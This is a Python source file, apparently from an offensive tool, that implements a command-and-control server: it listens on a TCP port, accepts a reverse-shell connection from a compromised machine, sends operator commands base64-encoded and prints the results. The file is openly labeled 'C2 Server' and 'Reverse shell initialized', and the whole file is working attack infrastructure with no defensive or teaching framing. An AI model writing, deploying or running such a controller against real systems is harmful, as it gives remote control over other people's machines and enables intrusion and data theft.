import sys
import queue
import socket
import base64
import threading
from datetime import datetime
import readline

from network.NetworkError import NetworkError
from network.vp_protocol.b64_send import b64_send
from network.vp_protocol.b64_recv import b64_recv


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.bind((self.host, self.port))
            except (PermissionError, OSError) as e:
                raise NetworkError(message=f"{e}")
            sock.listen(1)
            print(f"[*] C2 Server listening on ~ {self.host}:{self.port}.")
            while True:
                try:
                    conn, addr = sock.accept()
                except ConnectionError as e:
                    print(f"[!] Client connection error {e} "
                          f"{self.datestamp()}")
                print(f"[*] {addr[0]}:{addr[1]} ~ Reverse shell initialized "
                      f"{self.datestamp()}")
                client = threading.Thread(
                    target=self.receive_output,
                    args=(conn, addr),
                    daemon=True)
                client.start()
                try:
                    while True:
                        cmd = input()
                        if not cmd:
                            cmd = '\n'
                        b64_send(message_str=cmd, conn=conn)
                except NetworkError as e:
                    print(f"[!] {addr[0]}:{addr[1]} ~ Connection error, "
                          f"disconnecting {self.datestamp()}")
                    continue

    def receive_output(self, conn, addr):
        try:
            while True:
                message = b64_recv(conn=conn)
                if not message:
                    raise NetworkError(
                        message=f"{addr[0]}:{addr[1]} ~ Error lost connection "
                                f"{self.datestamp()}")
                else:
                    print(message, end='')
        except NetworkError as e:
            print(f"[!] {addr[0]}:{addr[1]} ~ Error receiving transmission.")
            conn.close()

    @staticmethod
    def datestamp():
        return f"@ {datetime.now().strftime('%m/%d/%Y-%H:%M:%S')}"
